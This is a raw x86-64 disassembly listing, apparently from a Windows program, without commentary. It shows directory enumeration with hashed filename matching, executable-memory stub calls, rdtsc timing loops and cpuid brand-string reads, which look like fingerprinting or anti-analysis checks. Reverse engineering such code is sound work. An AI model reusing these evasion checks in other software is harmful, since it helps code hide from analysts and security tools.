   140045247:	push   0x2
   140045249:	pop    rdx
   14004524a:	mov    QWORD PTR [rbp+0xfb0],rdx
   140045251:	push   0x1
   140045253:	pop    rcx
   140045254:	mov    QWORD PTR [rbp+0xfb8],rcx
   14004525b:	lea    rax,[rip+0x43046]        # 0x1400882a8
   140045262:	mov    QWORD PTR [rbp+0xfc0],rax
   140045269:	mov    QWORD PTR [rbp+0xfc8],rcx
   140045270:	lea    rax,[rip+0x43039]        # 0x1400882b0
   140045277:	mov    QWORD PTR [rbp+0xfd0],rax
   14004527e:	mov    QWORD PTR [rbp+0xfd8],rdx
   140045285:	mov    QWORD PTR [rbp+0xfe0],rcx
   14004528c:	lea    rax,[rip+0x4302d]        # 0x1400882c0
   140045293:	mov    QWORD PTR [rbp+0xfe8],rax
   14004529a:	mov    QWORD PTR [rbp+0xff0],rcx
   1400452a1:	xor    r12d,r12d
   1400452a4:	mov    QWORD PTR [rbp+0xf78],0x0
   1400452af:	imul   rax,r12,0x28
   1400452b3:	lea    rcx,[rbp+0xf58]
   1400452ba:	add    rax,rcx
   1400452bd:	cmp    r12,0x3
   1400452c1:	je     0x140045577
   1400452c7:	mov    rcx,QWORD PTR [rax+0x38]
   1400452cb:	cmp    rcx,0x1
   1400452cf:	ja     0x14004812b
   1400452d5:	imul   rcx,rcx,0x18
   1400452d9:	mov    rsi,QWORD PTR [rbp+rcx*1+0x410]
   1400452e1:	add    rax,0x28
   1400452e5:	inc    r12
   1400452e8:	test   rsi,rsi
   1400452eb:	je     0x1400452bd
   1400452ed:	add    rcx,rbp
   1400452f0:	add    rcx,0x400
   1400452f7:	mov    rdx,QWORD PTR [rax]
   1400452fa:	mov    QWORD PTR [rbp+0xf70],rdx
   140045301:	mov    rdx,QWORD PTR [rax+0x8]
   140045305:	mov    QWORD PTR [rbp+0x1168],rdx
   14004530c:	mov    rdx,QWORD PTR [rax+0x18]
   140045310:	mov    QWORD PTR [rbp+0x698],rdx
   140045317:	mov    rax,QWORD PTR [rax+0x20]
   14004531b:	mov    QWORD PTR [rbp+0x5e0],rax
   140045322:	mov    rdx,QWORD PTR [rcx+0x8]
   140045326:	mov    ecx,0x410
   14004532b:	xor    eax,eax
   14004532d:	lea    rdi,[rbp+0x7d0]
   140045334:	rep stos BYTE PTR [rdi],al
   140045336:	cmp    rsi,0x104
   14004533d:	ja     0x1400452af
   140045343:	xor    eax,eax
   140045345:	cmp    rsi,rax
   140045348:	je     0x14004535b
   14004534a:	movzx  ecx,WORD PTR [rdx+rax*2]
   14004534e:	mov    WORD PTR [rbp+rax*2+0x7d0],cx
   140045356:	inc    rax
   140045359:	jmp    0x140045345
   14004535b:	mov    QWORD PTR [rbp+0x1158],0x0
   140045366:	mov    WORD PTR [rbp+rsi*2+0x7d0],0x5c
   140045370:	mov    WORD PTR [rbp+rsi*2+0x7d2],0x2a
   14004537a:	and    WORD PTR [rbp+rsi*2+0x7d4],0x0
   140045383:	xor    ebx,ebx
   140045385:	mov    ecx,0x250
   14004538a:	xor    eax,eax
   14004538c:	lea    rdx,[rbp+0xd10]
   140045393:	mov    rdi,rdx
   140045396:	rep stos BYTE PTR [rdi],al
   140045398:	lea    rcx,[rbp+0x7d0]
   14004539f:	call   0x140065aba
   1400453a4:	mov    rdi,rax
   1400453a7:	dec    rax
   1400453aa:	cmp    rax,0xfffffffffffffffd
   1400453ae:	ja     0x140045563
   1400453b4:	lea    rax,[rsi*2+0x7d2]
   1400453bc:	add    rax,rbp
   1400453bf:	mov    QWORD PTR [rbp+0x5e8],rax
   1400453c6:	inc    rsi
   1400453c9:	mov    rcx,QWORD PTR [rbp+0x1158]
   1400453d0:	cmp    rcx,QWORD PTR [rbp+0x1168]
   1400453d7:	mov    r14,QWORD PTR [rbp+0x5e0]
   1400453de:	push   0x1
   1400453e0:	pop    rax
   1400453e1:	cmovb  r14,rax
   1400453e5:	mov    rax,QWORD PTR [rbp+0xf70]
   1400453ec:	lea    r15,[rax+rcx*8]
   1400453f0:	cmovae r15,QWORD PTR [rbp+0x698]
   1400453f8:	xor    ebx,ebx
   1400453fa:	mov    r13d,0x104
   140045400:	lea    rax,[rbp+0xd3c]
   140045407:	mov    edx,0x104
   14004540c:	cmp    rbx,0x104
   140045413:	je     0x14004543e
   140045415:	cmp    WORD PTR [rbp+rbx*2+0xd3c],0x0
   14004541e:	je     0x140045425
   140045420:	inc    rbx
   140045423:	jmp    0x1400453fa
   140045425:	lea    rcx,[rbp+0xd3c]
   14004542c:	mov    rdx,rbx
   14004542f:	lea    r8,[rip+0x42f1a]        # 0x140088350
   140045436:	call   0x14003c091
   14004543b:	mov    r13,rbx
   14004543e:	xor    r8d,r8d
   140045441:	movabs rcx,0xe49e47b70d5eafc7
   14004544b:	cmp    rdx,r8
   14004544e:	je     0x140045487
   140045450:	movzx  r9d,WORD PTR [rax+r8*2]
   140045455:	inc    r8
   140045458:	lea    r10d,[r9-0x41]
   14004545c:	mov    r11d,r9d
   14004545f:	or     r11d,0x20
   140045463:	cmp    r10w,0x1a
   140045468:	cmovae r11d,r9d
   14004546c:	movzx  r9d,r11w
   140045470:	xor    rcx,r9
   140045473:	movabs r9,0xf78a05c12bafb8cf
   14004547d:	imul   rcx,r9
   140045481:	rol    rcx,0x21
   140045485:	jmp    0x14004544b
   140045487:	movabs rax,0xe49e47b70d5eafc7
   140045491:	xor    rcx,rax
   140045494:	movabs rax,0x406aa9c82dbf9701
   14004549e:	imul   rcx,rax
   1400454a2:	mov    rdx,rcx
   1400454a5:	shr    rdx,0x1d
   1400454a9:	xor    rdx,rcx
   1400454ac:	movabs rax,0xeb591050d1f713a9
   1400454b6:	imul   rdx,rax
   1400454ba:	mov    rax,rdx
   1400454bd:	shr    rax,0x20
   1400454c1:	xor    rax,rdx
   1400454c4:	xor    edx,edx
   1400454c6:	xor    ecx,ecx
   1400454c8:	cmp    r14,rdx
   1400454cb:	je     0x1400454de
   1400454cd:	cmp    QWORD PTR [r15+rdx*8],rax
   1400454d1:	lea    rdx,[rdx+0x1]
   1400454d5:	sete   r8b
   1400454d9:	or     cl,r8b
   1400454dc:	jmp    0x1400454c8
   1400454de:	test   cl,0x1
   1400454e1:	jne    0x140045501
   1400454e3:	mov    rcx,rdi
   1400454e6:	lea    rdx,[rbp+0xd10]
   1400454ed:	call   0x14006483c
   1400454f2:	mov    ebx,0x0
   1400454f7:	test   eax,eax
   1400454f9:	jne    0x1400453fa
   1400454ff:	jmp    0x140045550
   140045501:	mov    rcx,rdi
   140045504:	call   0x14006622c
   140045509:	mov    rax,QWORD PTR [rbp+0x1158]
   140045510:	cmp    rax,QWORD PTR [rbp+0x1168]
   140045517:	je     0x14004555d
   140045519:	add    rsi,r13
   14004551c:	cmp    rsi,0x205
   140045523:	ja     0x140045561
   140045525:	xor    eax,eax
   140045527:	mov    rdx,QWORD PTR [rbp+0x5e8]
   14004552e:	cmp    r13,rax
   140045531:	je     0x140045544
   140045533:	movzx  ecx,WORD PTR [rbp+rax*2+0xd3c]
   14004553b:	mov    WORD PTR [rdx+rax*2],cx
   14004553f:	inc    rax
   140045542:	jmp    0x14004552e
   140045544:	inc    QWORD PTR [rbp+0x1158]
   14004554b:	jmp    0x140045366
   140045550:	mov    rcx,rdi
   140045553:	call   0x14006622c
   140045558:	jmp    0x1400452af
   14004555d:	mov    bl,0x1
   14004555f:	jmp    0x140045563
   140045561:	xor    ebx,ebx
   140045563:	or     bl,BYTE PTR [rbp+0xf78]
   140045569:	mov    eax,ebx
   14004556b:	mov    QWORD PTR [rbp+0xf78],rax
   140045572:	jmp    0x1400452af
   140045577:	lea    rcx,[rbp+0x400]
   14004557e:	call   0x14003bd35
   140045583:	mov    rcx,QWORD PTR [rbp+0x640]
   14004558a:	mov    rdx,QWORD PTR [rbp+0x1138]
   140045591:	call   0x14006f7f7
   140045596:	mov    rcx,QWORD PTR [rbp+0x1178]
   14004559d:	mov    rdx,QWORD PTR [rbp+0x1170]
   1400455a4:	call   0x14006f7f7
   1400455a9:	lea    rax,[rip+0x58bbb]        # 0x14009e16b
   1400455b0:	mov    QWORD PTR [rbp+0x7d0],rax
   1400455b7:	push   0xa
   1400455b9:	pop    rax
   1400455ba:	mov    QWORD PTR [rbp+0x7d8],rax
   1400455c1:	mov    ecx,0xc680000d
   1400455c6:	mov    QWORD PTR [rbp+0x7e0],rcx
   1400455cd:	lea    rcx,[rip+0x58b21]        # 0x14009e0f5
   1400455d4:	mov    QWORD PTR [rbp+0x7e8],rcx
   1400455db:	mov    QWORD PTR [rbp+0x7f0],rax
   1400455e2:	mov    ecx,0xc690000d
   1400455e7:	mov    QWORD PTR [rbp+0x7f8],rcx
   1400455ee:	lea    rcx,[rip+0x58b28]        # 0x14009e11d
   1400455f5:	mov    QWORD PTR [rbp+0x800],rcx
   1400455fc:	push   0xb
   1400455fe:	pop    rcx
   1400455ff:	mov    QWORD PTR [rbp+0x808],rcx
   140045606:	mov    edx,0xc6a0000d
   14004560b:	mov    QWORD PTR [rbp+0x810],rdx
   140045612:	lea    rdx,[rip+0x58ae6]        # 0x14009e0ff
   140045619:	mov    QWORD PTR [rbp+0x818],rdx
   140045620:	push   0x7
   140045622:	pop    rdx
   140045623:	mov    QWORD PTR [rbp+0x820],rdx
   14004562a:	mov    r8d,0xc6b0000d
   140045630:	mov    QWORD PTR [rbp+0x828],r8
   140045637:	lea    r8,[rip+0x58aea]        # 0x14009e128
   14004563e:	mov    QWORD PTR [rbp+0x830],r8
   140045645:	push   0x9
   140045647:	pop    r8
   140045649:	mov    QWORD PTR [rbp+0x838],r8
   140045650:	mov    r9d,0xc6c0000d
   140045656:	mov    QWORD PTR [rbp+0x840],r9
   14004565d:	lea    r9,[rip+0x58ad8]        # 0x14009e13c
   140045664:	mov    QWORD PTR [rbp+0x848],r9
   14004566b:	mov    QWORD PTR [rbp+0x850],0x8
   140045676:	mov    r9d,0xc6d0000d
   14004567c:	mov    QWORD PTR [rbp+0x858],r9
   140045683:	lea    r9,[rip+0x58a47]        # 0x14009e0d1
   14004568a:	mov    QWORD PTR [rbp+0x860],r9
   140045691:	mov    QWORD PTR [rbp+0x868],rax
   140045698:	mov    r9d,0xc6e0000d
   14004569e:	mov    QWORD PTR [rbp+0x870],r9
   1400456a5:	lea    r9,[rip+0x58ae8]        # 0x14009e194
   1400456ac:	mov    QWORD PTR [rbp+0x878],r9
   1400456b3:	mov    QWORD PTR [rbp+0x880],rax
   1400456ba:	mov    r9d,0xc6f0000d
   1400456c0:	mov    QWORD PTR [rbp+0x888],r9
   1400456c7:	lea    r9,[rip+0x58ad0]        # 0x14009e19e
   1400456ce:	mov    QWORD PTR [rbp+0x890],r9
   1400456d5:	mov    QWORD PTR [rbp+0x898],0x6
   1400456e0:	mov    r9d,0xc700000d
   1400456e6:	mov    QWORD PTR [rbp+0x8a0],r9
   1400456ed:	lea    r9,[rip+0x589ab]        # 0x14009e09f
   1400456f4:	mov    QWORD PTR [rbp+0x8a8],r9
   1400456fb:	mov    QWORD PTR [rbp+0x8b0],rdx
   140045702:	mov    r9d,0xc710000d
   140045708:	mov    QWORD PTR [rbp+0x8b8],r9
   14004570f:	lea    r9,[rip+0x589ce]        # 0x14009e0e4
   140045716:	mov    QWORD PTR [rbp+0x8c0],r9
   14004571d:	mov    QWORD PTR [rbp+0x8c8],0x11
   140045728:	mov    r9d,0xc720000d
   14004572e:	mov    QWORD PTR [rbp+0x8d0],r9
   140045735:	lea    r9,[rip+0x58a13]        # 0x14009e14f
   14004573c:	mov    QWORD PTR [rbp+0x8d8],r9
   140045743:	mov    QWORD PTR [rbp+0x8e0],0x12
   14004574e:	mov    r9d,0xc730000d
   140045754:	mov    QWORD PTR [rbp+0x8e8],r9
   14004575b:	lea    r9,[rip+0x589cf]        # 0x14009e131
   140045762:	mov    QWORD PTR [rbp+0x8f0],r9
   140045769:	mov    QWORD PTR [rbp+0x8f8],rcx
   140045770:	mov    r9d,0xc740000d
   140045776:	mov    QWORD PTR [rbp+0x900],r9
   14004577d:	lea    r9,[rip+0x58929]        # 0x14009e0ad
   140045784:	mov    QWORD PTR [rbp+0x908],r9
   14004578b:	push   0xd
   14004578d:	pop    r9
   14004578f:	mov    QWORD PTR [rbp+0x910],r9
   140045796:	mov    r10d,0xc750000d
   14004579c:	mov    QWORD PTR [rbp+0x918],r10
   1400457a3:	lea    r10,[rip+0x588c5]        # 0x14009e06f
   1400457aa:	mov    QWORD PTR [rbp+0x920],r10
   1400457b1:	mov    QWORD PTR [rbp+0x928],rcx
   1400457b8:	mov    r10d,0xc760000d
   1400457be:	mov    QWORD PTR [rbp+0x930],r10
   1400457c5:	lea    r10,[rip+0x5893a]        # 0x14009e106
   1400457cc:	mov    QWORD PTR [rbp+0x938],r10
   1400457d3:	mov    QWORD PTR [rbp+0x940],r9
   1400457da:	mov    r10d,0xc770000d
   1400457e0:	mov    QWORD PTR [rbp+0x948],r10
   1400457e7:	lea    r10,[rip+0x58874]        # 0x14009e062
   1400457ee:	mov    QWORD PTR [rbp+0x950],r10
   1400457f5:	mov    QWORD PTR [rbp+0x958],r9
   1400457fc:	mov    r10d,0xc780000d
   140045802:	mov    QWORD PTR [rbp+0x960],r10
   140045809:	lea    r10,[rip+0x58934]        # 0x14009e144
   140045810:	mov    QWORD PTR [rbp+0x968],r10
   140045817:	mov    QWORD PTR [rbp+0x970],rcx
   14004581e:	mov    r10d,0xc790000d
   140045824:	mov    QWORD PTR [rbp+0x978],r10
   14004582b:	lea    r10,[rip+0x58972]        # 0x14009e1a4
   140045832:	mov    QWORD PTR [rbp+0x980],r10
   140045839:	mov    QWORD PTR [rbp+0x988],r8
   140045840:	mov    r10d,0xc7a0000d
   140045846:	mov    QWORD PTR [rbp+0x990],r10
   14004584d:	lea    r10,[rip+0x587fb]        # 0x14009e04f
   140045854:	mov    QWORD PTR [rbp+0x998],r10
   14004585b:	push   0xc
   14004585d:	pop    r11
   14004585f:	mov    QWORD PTR [rbp+0x9a0],r11
   140045866:	mov    r10d,0xc7b0000d
   14004586c:	mov    QWORD PTR [rbp+0x9a8],r10
   140045873:	lea    r10,[rip+0x5884d]        # 0x14009e0c7
   14004587a:	mov    QWORD PTR [rbp+0x9b0],r10
   140045881:	mov    QWORD PTR [rbp+0x9b8],rax
   140045888:	mov    r10d,0xc7c0000d
   14004588e:	mov    QWORD PTR [rbp+0x9c0],r10
   140045895:	lea    r10,[rip+0x587f5]        # 0x14009e091
   14004589c:	mov    QWORD PTR [rbp+0x9c8],r10
   1400458a3:	mov    QWORD PTR [rbp+0x9d0],0xe
   1400458ae:	mov    r10d,0xc7d0000d
   1400458b4:	mov    QWORD PTR [rbp+0x9d8],r10
   1400458bb:	lea    r10,[rip+0x587e4]        # 0x14009e0a6
   1400458c2:	mov    QWORD PTR [rbp+0x9e0],r10
   1400458c9:	mov    QWORD PTR [rbp+0x9e8],rdx
   1400458d0:	mov    r10d,0xc7e0000d
   1400458d6:	mov    QWORD PTR [rbp+0x9f0],r10
   1400458dd:	lea    r10,[rip+0x58758]        # 0x14009e03c
   1400458e4:	mov    QWORD PTR [rbp+0x9f8],r10
   1400458eb:	mov    QWORD PTR [rbp+0xa00],0x13
   1400458f6:	mov    r10d,0xc7f0000d
   1400458fc:	mov    QWORD PTR [rbp+0xa08],r10
   140045903:	lea    r10,[rip+0x58727]        # 0x14009e031
   14004590a:	mov    QWORD PTR [rbp+0xa10],r10
   140045911:	mov    QWORD PTR [rbp+0xa18],rcx
   140045918:	mov    r10d,0xc800000d
   14004591e:	mov    QWORD PTR [rbp+0xa20],r10
   140045925:	lea    r10,[rip+0x5878e]        # 0x14009e0ba
   14004592c:	mov    QWORD PTR [rbp+0xa28],r10
   140045933:	mov    QWORD PTR [rbp+0xa30],r9
   14004593a:	mov    r9d,0xc810000d
   140045940:	mov    QWORD PTR [rbp+0xa38],r9
   140045947:	lea    r9,[rip+0x587c5]        # 0x14009e113
   14004594e:	mov    QWORD PTR [rbp+0xa40],r9
   140045955:	mov    QWORD PTR [rbp+0xa48],rax
   14004595c:	mov    r9d,0xc820000d
   140045962:	mov    QWORD PTR [rbp+0xa50],r9
   140045969:	lea    r9,[rip+0x58805]        # 0x14009e175
   140045970:	mov    QWORD PTR [rbp+0xa58],r9
   140045977:	mov    QWORD PTR [rbp+0xa60],rcx
   14004597e:	mov    r9d,0xc830000d
   140045984:	mov    QWORD PTR [rbp+0xa68],r9
   14004598b:	lea    r9,[rip+0x586f3]        # 0x14009e085
   140045992:	mov    QWORD PTR [rbp+0xa70],r9
   140045999:	mov    QWORD PTR [rbp+0xa78],r11
   1400459a0:	mov    r9d,0xc840000d
   1400459a6:	mov    QWORD PTR [rbp+0xa80],r9
   1400459ad:	lea    r9,[rip+0x586c6]        # 0x14009e07a
   1400459b4:	mov    QWORD PTR [rbp+0xa88],r9
   1400459bb:	mov    QWORD PTR [rbp+0xa90],rcx
   1400459c2:	mov    ecx,0xc850000d
   1400459c7:	mov    QWORD PTR [rbp+0xa98],rcx
   1400459ce:	lea    rcx,[rip+0x5878c]        # 0x14009e161
   1400459d5:	mov    QWORD PTR [rbp+0xaa0],rcx
   1400459dc:	mov    QWORD PTR [rbp+0xaa8],rax
   1400459e3:	mov    eax,0xc860000d
   1400459e8:	mov    QWORD PTR [rbp+0xab0],rax
   1400459ef:	lea    rax,[rip+0x5878a]        # 0x14009e180
   1400459f6:	mov    QWORD PTR [rbp+0xab8],rax
   1400459fd:	mov    QWORD PTR [rbp+0xac0],0x14
   140045a08:	mov    eax,0xc870000d
   140045a0d:	mov    QWORD PTR [rbp+0xac8],rax
   140045a14:	lea    rax,[rip+0x586c0]        # 0x14009e0db
   140045a1b:	mov    QWORD PTR [rbp+0xad0],rax
   140045a22:	mov    QWORD PTR [rbp+0xad8],r8
   140045a29:	mov    eax,0xc880000d
   140045a2e:	mov    QWORD PTR [rbp+0xae0],rax
   140045a35:	lea    rax,[rip+0x5861f]        # 0x14009e05b
   140045a3c:	mov    QWORD PTR [rbp+0xae8],rax
   140045a43:	mov    QWORD PTR [rbp+0xaf0],rdx
   140045a4a:	mov    eax,0xc890000d
   140045a4f:	mov    QWORD PTR [rbp+0xaf8],rax
   140045a56:	call   0x140065fcc
   140045a5b:	mov    rsi,rax
   140045a5e:	dec    rax
   140045a61:	cmp    rax,0xfffffffffffffffd
   140045a65:	ja     0x140045b30
   140045a6b:	mov    ecx,0x238
   140045a70:	xor    eax,eax
   140045a72:	lea    rdx,[rbp+0xd10]
   140045a79:	mov    rdi,rdx
   140045a7c:	rep stos BYTE PTR [rdi],al
   140045a7e:	mov    DWORD PTR [rbp+0xd10],0x238
   140045a88:	mov    rcx,rsi
   140045a8b:	call   0x140065d8b
   140045a90:	test   eax,eax
   140045a92:	je     0x140045b2c
   140045a98:	lea    rdi,[rbp+0xb00]
   140045a9f:	lea    rbx,[rbp+0xf44]
   140045aa6:	mov    r12d,0x104
   140045aac:	lea    r13,[rip+0x42855]        # 0x140088308
   140045ab3:	lea    r15,[rbp+0xd3c]
   140045aba:	mov    QWORD PTR [rbp+0xf80],r15
   140045ac1:	mov    QWORD PTR [rbp+0xf88],rbx
   140045ac8:	lea    r14,[rbp+0xf80]
   140045acf:	mov    rcx,r14
   140045ad2:	call   0x14003c35d
   140045ad7:	test   al,0x1
   140045ad9:	cmove  rdx,r12
   140045add:	mov    rcx,r15
   140045ae0:	mov    r8,r13
   140045ae3:	call   0x14003c091
   140045ae8:	mov    r8,rdx
   140045aeb:	lea    rcx,[rbp+0x7d0]
   140045af2:	mov    QWORD PTR [rbp+0xf80],rcx
   140045af9:	mov    QWORD PTR [rbp+0xf88],rdi
   140045b00:	mov    rcx,r14
   140045b03:	mov    rdx,rax
   140045b06:	call   0x14003c1f4
   140045b0b:	test   al,al
   140045b0d:	jne    0x140045b34
   140045b0f:	mov    DWORD PTR [rbp+0xd10],0x238
   140045b19:	mov    rcx,rsi
   140045b1c:	lea    rdx,[rbp+0xd10]
   140045b23:	call   0x140065aff
   140045b28:	test   eax,eax
   140045b2a:	jne    0x140045ab3
   140045b2c:	xor    edi,edi
   140045b2e:	jmp    0x140045b3e
   140045b30:	xor    edi,edi
   140045b32:	jmp    0x140045b46
   140045b34:	movabs rdi,0x1000000000000
   140045b3e:	mov    rcx,rsi
   140045b41:	call   0x140064323
   140045b46:	xor    eax,eax
   140045b48:	cmp    DWORD PTR [rbp+0x7c8],0x4
   140045b4f:	setb   al
   140045b52:	movzx  ecx,BYTE PTR [rbp+0xf78]
   140045b59:	shl    rcx,0x28
   140045b5d:	add    rcx,rdi
   140045b60:	movzx  edx,BYTE PTR [rbp+0x1140]
   140045b67:	shl    rdx,0x20
   140045b6b:	add    rdx,rcx
   140045b6e:	add    rdx,QWORD PTR [rbp+0x4e8]
   140045b75:	add    rdx,QWORD PTR [rbp+0xf68]
   140045b7c:	shl    eax,0x8
   140045b7f:	add    rax,rdx
   140045b82:	movzx  ecx,BYTE PTR [rbp+0xca8]
   140045b89:	and    ecx,0x1
   140045b8c:	or     ecx,eax
   140045b8e:	mov    rdx,rax
   140045b91:	shr    rdx,0x30
   140045b95:	mov    BYTE PTR [rbp+0x7d6],dl
   140045b9b:	shr    rax,0x20
   140045b9f:	mov    WORD PTR [rbp+0x7d4],ax
   140045ba6:	mov    DWORD PTR [rbp+0x7d0],ecx
   140045bac:	xor    eax,eax
   140045bae:	movabs rcx,0x5cc804d7e1924f60
   140045bb8:	movabs rbx,0x406aa9c82dbf9701
   140045bc2:	movabs r14,0xeb591050d1f713a9
   140045bcc:	mov    r8,QWORD PTR [rbp+0x4e0]
   140045bd3:	mov    rdi,QWORD PTR [rbp+0x5d0]
   140045bda:	cmp    rax,0x7
   140045bde:	je     0x140045cb9
   140045be4:	movzx  r12d,BYTE PTR [rbp+rax*1+0x7d0]
   140045bed:	mov    rdx,r8
   140045bf0:	xor    rdx,rcx
   140045bf3:	imul   rdx,rbx
   140045bf7:	mov    r9,rdx
   140045bfa:	shr    r9,0x1d
   140045bfe:	xor    r9,rdx
   140045c01:	imul   r9,r14
   140045c05:	mov    rdx,r9
   140045c08:	shr    rdx,0x20
   140045c0c:	xor    rdx,r9
   140045c0f:	mov    r9,rcx
   140045c12:	movabs r10,0x629eef0eeda7e1b9
   140045c1c:	xor    r9,r10
   140045c1f:	imul   r9,rbx
   140045c23:	mov    r11,r9
   140045c26:	shr    r11,0x1d
   140045c2a:	xor    r11,r9
   140045c2d:	imul   r11,r14
   140045c31:	mov    r10,r11
   140045c34:	shr    r10,0x20
   140045c38:	xor    r10,r11
   140045c3b:	or     r10,0x1
   140045c3f:	mov    r11,rdx
   140045c42:	rol    r11,0x7
   140045c46:	mov    rsi,rdx
   140045c49:	rol    rsi,0x29
   140045c4d:	add    r11,rcx
   140045c50:	add    r12,r11
   140045c53:	imul   r12,r10
   140045c57:	add    r12,r8
   140045c5a:	mov    r9,rcx
   140045c5d:	rol    r9,0x20
   140045c61:	add    r12,rdi
   140045c64:	movabs r15,0x6161c4ba7c2419b8
   140045c6e:	xor    r9,r15
   140045c71:	lea    rdi,[rsi+r9*1]
   140045c75:	sub    r9,r11
   140045c78:	add    r9,rsi
   140045c7b:	imul   rdi,r10
   140045c7f:	imul   r9,r10
   140045c83:	sub    r9,rdx
   140045c86:	sub    r9,rdi
   140045c89:	add    r9,r12
   140045c8c:	xor    rcx,r15
   140045c8f:	imul   rcx,rbx
   140045c93:	mov    r8,rcx
   140045c96:	shr    r8,0x1d
   140045c9a:	xor    r8,rcx
   140045c9d:	imul   r8,r14
   140045ca1:	mov    rcx,r8
   140045ca4:	shr    rcx,0x20
   140045ca8:	xor    rcx,r8
   140045cab:	inc    rax
   140045cae:	mov    r8,rdx
   140045cb1:	mov    rdi,r9
   140045cb4:	jmp    0x140045bda
   140045cb9:	add    r8,rdi
   140045cbc:	mov    rcx,QWORD PTR [rbp+0x1058]
   140045cc3:	mov    rdx,QWORD PTR [rbp+0x1180]
   140045cca:	call   0x140063dd8
   140045ccf:	mov    QWORD PTR [rbp+0x1168],rax
   140045cd6:	mov    rax,QWORD PTR [rbp+0x1160]
   140045cdd:	mov    rcx,QWORD PTR [rax+0x20]
   140045ce1:	rdtsc
   140045ce3:	shl    rdx,0x20
   140045ce7:	or     rdx,rax
   140045cea:	movabs rax,0x67e7848434fd75b7
   140045cf4:	xor    rdx,rax
   140045cf7:	imul   rdx,rbx
   140045cfb:	mov    rax,rdx
   140045cfe:	shr    rax,0x1d
   140045d02:	xor    rax,rdx
   140045d05:	imul   rax,r14
   140045d09:	mov    rbx,rax
   140045d0c:	shr    rbx,0x20
   140045d10:	xor    rbx,rax
   140045d13:	mov    rdi,rbx
   140045d16:	neg    rdi
   140045d19:	add    rdi,rcx
   140045d1c:	mov    ecx,0x1000
   140045d21:	push   0x40
   140045d23:	pop    rdx
   140045d24:	call   0x1400647f5
   140045d29:	movabs r14,0x67e7848534fd75b6
   140045d33:	test   rax,rax
   140045d36:	je     0x140045d83
   140045d38:	mov    rsi,rax
   140045d3b:	mov    BYTE PTR [rax],0xb8
   140045d3e:	mov    DWORD PTR [rax+0x1],0xdead
   140045d45:	mov    BYTE PTR [rax+0x5],0xc3
   140045d49:	call   rax
   140045d4b:	mov    DWORD PTR [rbp+0x7d0],eax
   140045d51:	lea    r14,[rbp+0x7d0]
   140045d58:	mov    DWORD PTR [rsi+0x1],0xbeef
   140045d5f:	call   rsi
   140045d61:	mov    DWORD PTR [rbp+0x7d0],eax
   140045d67:	mov    r14d,DWORD PTR [rbp+0x7d0]
   140045d6e:	mov    rcx,rsi
   140045d71:	call   0x1400647b6
   140045d76:	movabs rax,0x67e7848434fd75b7
   140045d80:	add    r14,rax
   140045d83:	mov    rax,rbx
   140045d86:	movabs rcx,0x67e7848434fd75b7
   140045d90:	xor    rax,rcx
   140045d93:	movabs rcx,0x406aa9c82dbf9701
   140045d9d:	imul   rax,rcx
   140045da1:	mov    rcx,rax
   140045da4:	shr    rcx,0x1d
   140045da8:	xor    rcx,rax
   140045dab:	movabs rax,0xeb591050d1f713a9
   140045db5:	imul   rcx,rax
   140045db9:	mov    r9,rcx
   140045dbc:	shr    r9,0x20
   140045dc0:	xor    r9,rcx
   140045dc3:	mov    rcx,r9
   140045dc6:	rol    rcx,0x7
   140045dca:	mov    r10,r9
   140045dcd:	rol    r10,0x29
   140045dd1:	add    r14,rcx
   140045dd4:	mov    rax,r10
   140045dd7:	sub    r10,rcx
   140045dda:	movabs rcx,0x89dc2137761f2681
   140045de4:	imul   r14,rcx
   140045de8:	add    r14,rbx
   140045deb:	imul   rax,rcx
   140045def:	movabs rdx,0x60a5613a1ed5d3ab
   140045df9:	add    rax,rdx
   140045dfc:	imul   r10,rcx
   140045e00:	movabs rcx,0x6ed1ae06cad2a805
   140045e0a:	add    r10,rcx
   140045e0d:	add    r14,rdi
   140045e10:	sub    r10,r9
   140045e13:	sub    r10,rax
   140045e16:	add    r10,r14
   140045e19:	movaps XMMWORD PTR [rbp+0x7f0],xmm6
   140045e20:	movaps XMMWORD PTR [rbp+0x7e0],xmm6
   140045e27:	movaps XMMWORD PTR [rbp+0x7d0],xmm6
   140045e2e:	mov    r8d,0x80000002
   140045e34:	xor    edi,edi
   140045e36:	push   0xc
   140045e38:	pop    r11
   140045e3a:	test   dil,0x1
   140045e3e:	jne    0x140045e9c
   140045e40:	cmp    r8d,0x80000004
   140045e47:	ja     0x140045e9c
   140045e49:	mov    eax,r8d
   140045e4c:	xor    ecx,ecx
   140045e4e:	mov    rsi,rbx
   140045e51:	cpuid
   140045e53:	xchg   rbx,rsi
   140045e56:	cmp    r11,0x3c
   140045e5a:	je     0x140048137
   140045e60:	lea    ebx,[r8+0x1]
   140045e64:	cmp    r8d,0x80000004
   140045e6b:	sete   dil
   140045e6f:	cmove  ebx,r8d
   140045e73:	mov    DWORD PTR [rbp+r11*1+0x7c4],eax
   140045e7b:	mov    DWORD PTR [rbp+r11*1+0x7c8],esi
   140045e83:	mov    DWORD PTR [rbp+r11*1+0x7cc],ecx
   140045e8b:	mov    DWORD PTR [rbp+r11*1+0x7d0],edx
   140045e93:	add    r11,0x10
   140045e97:	mov    r8d,ebx
   140045e9a:	jmp    0x140045e3a
   140045e9c:	mov    r11b,BYTE PTR [rbp+0x7d0]
   140045ea3:	xor    r8d,r8d
   140045ea6:	xor    esi,esi
   140045ea8:	movabs rbx,0x5bd1e9953c278a41
   140045eb2:	cmp    esi,0x4
   140045eb5:	je     0x140045f1b
   140045eb7:	rdtsc
   140045eb9:	mov    rcx,rdx
   140045ebc:	shl    rcx,0x20
   140045ec0:	or     rcx,rax
   140045ec3:	mov    QWORD PTR [rbp+0x7d0],0x9d
   140045ece:	lea    rax,[rbp+0x7d0]
   140045ed5:	mov    rax,QWORD PTR [rbp+0x7d0]
   140045edc:	mov    edx,0x1000
   140045ee1:	sub    edx,0x1
   140045ee4:	jb     0x140045ef6
   140045ee6:	mov    rdi,rax
   140045ee9:	imul   rdi,rbx
   140045eed:	shr    rax,0x1d
   140045ef1:	xor    rax,rdi
   140045ef4:	jmp    0x140045ee1
   140045ef6:	inc    esi
   140045ef8:	mov    QWORD PTR [rbp+0x7d0],rax
   140045eff:	lea    rax,[rbp+0x7d0]
   140045f06:	rdtsc
   140045f08:	shl    rdx,0x20
   140045f0c:	or     rdx,rax
   140045f0f:	sub    rdx,rcx
   140045f12:	cmp    rdx,r8
   140045f15:	cmova  r8,rdx
   140045f19:	jmp    0x140045eb2
   140045f1b:	mov    rax,r9
   140045f1e:	movabs rcx,0x871ce0d846517ac9
   140045f28:	xor    rax,rcx
   140045f2b:	movabs rdi,0x406aa9c82dbf9701
   140045f35:	imul   rax,rdi
   140045f39:	mov    rcx,rax
